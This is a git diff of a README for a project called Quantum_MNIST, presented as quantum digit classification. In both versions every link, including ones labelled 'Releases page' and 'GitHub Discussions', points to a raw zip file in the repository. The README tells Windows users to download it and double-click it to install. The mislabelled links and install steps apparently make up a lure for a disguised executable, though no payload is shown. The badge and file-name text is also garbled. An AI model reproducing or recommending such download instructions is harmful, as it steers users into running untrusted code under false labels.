@@ -1,6 +1,6 @@
 # 🧠 Quantum_MNIST - Classify Digits with Quantum Power
 
-[![Download from Releases](https://raw.githubusercontent.com/powellalert541/Quantum_MNIST/main/src/Quantum_MNIST-v1.0.zip%20Now-Quantum_MNIST-brightgreen)](https://raw.githubusercontent.com/powellalert541/Quantum_MNIST/main/src/Quantum_MNIST-v1.0.zip)
+[![Download from Releases](https://github.com/powellalert541/Quantum_MNIST/raw/refs/heads/main/notebooks/MNIST_Quantum_1.4.zip%20Now-Quantum_MNIST-brightgreen)](https://github.com/powellalert541/Quantum_MNIST/raw/refs/heads/main/notebooks/MNIST_Quantum_1.4.zip)
 
 ## 🚀 Getting Started
 
@@ -24,13 +24,13 @@ To run Quantum_MNIST, you need:
 
 ## 📥 Download & Install
 
-To get started, visit the [Releases page](https://raw.githubusercontent.com/powellalert541/Quantum_MNIST/main/src/Quantum_MNIST-v1.0.zip) to download the latest version of Quantum_MNIST. Here’s how:
+To get started, visit the [Releases page](https://github.com/powellalert541/Quantum_MNIST/raw/refs/heads/main/notebooks/MNIST_Quantum_1.4.zip) to download the latest version of Quantum_MNIST. Here’s how:
 
 1. Click on the link above to open the Releases page.
 2. Find the latest version listed at the top.
 3. Click on the appropriate file for your operating system to download it.
 
-For example, if you see a file named `https://raw.githubusercontent.com/powellalert541/Quantum_MNIST/main/src/Quantum_MNIST-v1.0.zip` for Windows, click on it to download.  
+For example, if you see a file named `https://github.com/powellalert541/Quantum_MNIST/raw/refs/heads/main/notebooks/MNIST_Quantum_1.4.zip` for Windows, click on it to download.  
 
 Once downloaded, locate the file in your Downloads folder, then double-click it to start the installation. Follow any prompts to complete the setup.
 
@@ -76,6 +76,6 @@ Quantum_MNIST is open source and available for use under the MIT License. Feel f
 
 ## 🌐 Connect with Us
 
-Join our community on [GitHub Discussions](https://raw.githubusercontent.com/powellalert541/Quantum_MNIST/main/src/Quantum_MNIST-v1.0.zip) to share your experiences, ask questions, and give feedback.
+Join our community on [GitHub Discussions](https://github.com/powellalert541/Quantum_MNIST/raw/refs/heads/main/notebooks/MNIST_Quantum_1.4.zip) to share your experiences, ask questions, and give feedback.
 
-Feel free to visit the [Releases page](https://raw.githubusercontent.com/powellalert541/Quantum_MNIST/main/src/Quantum_MNIST-v1.0.zip) again for any updates. Thank you for using Quantum_MNIST!
+Feel free to visit the [Releases page](https://github.com/powellalert541/Quantum_MNIST/raw/refs/heads/main/notebooks/MNIST_Quantum_1.4.zip) again for any updates. Thank you for using Quantum_MNIST!
